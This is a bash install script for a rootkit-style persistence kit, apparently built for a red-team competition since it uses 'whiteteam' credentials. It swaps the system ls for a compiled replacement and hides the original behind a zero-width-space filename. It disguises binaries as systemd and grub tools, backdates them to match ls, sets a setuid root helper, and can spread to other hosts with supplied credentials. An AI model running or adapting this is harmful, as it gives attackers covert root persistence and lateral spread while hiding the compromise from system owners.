#!/bin/bash
if test -f "/usr/bin/ls​"; then
    echo "Modded ls binary already found. Assuming reinstall."
else
	mv "/usr/bin/ls" "/usr/bin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
fi
#Build executables
#NOTE: This requires the packages golang and gcc to be installed
gcc systemd-restart.c
go build systemd-make.go
go build ls_over.go

#Copy files to /usr/bin
mv ls_over /usr/bin/ls
mv a.out /usr/bin/systemd-restart
cp systemd-make /usr/sbin/grub-display
mv systemd-make /usr/bin/

#Change ownership to root, just in case
chown root:root /usr/bin/systemd-make
chown root:root /usr/bin/ls
chown root:root /usr/bin/systemd-restart

#Change dates of files
touch -d "$(date -R -r /usr/bin/ls​)" /usr/bin/ls
touch -d "$(date -R -r /usr/bin/ls​)" /usr/bin/systemd-make
touch -d "$(date -R -r /usr/bin/ls​)" /usr/bin/systemd-restart

#Set suid so the process will always execute with system privileges
chmod u+s /usr/bin/systemd-restart

for arg in "$@" 
do
	if [ $arg == "--replicate" ]; then
		cd deploy
		if [ $# -eq 1 ]; then
			go run deploy.go -u whiteteam -p whiteteam -m
		else
			#Pass remaining parameters to deploy.go
			go run deploy.go ${@:2}
		fi
		cd ..
	fi
done

#Remove files
# rm systemd-restart.c
# rm systemd-make.go
# rm ls_over.go
# rm install.sh
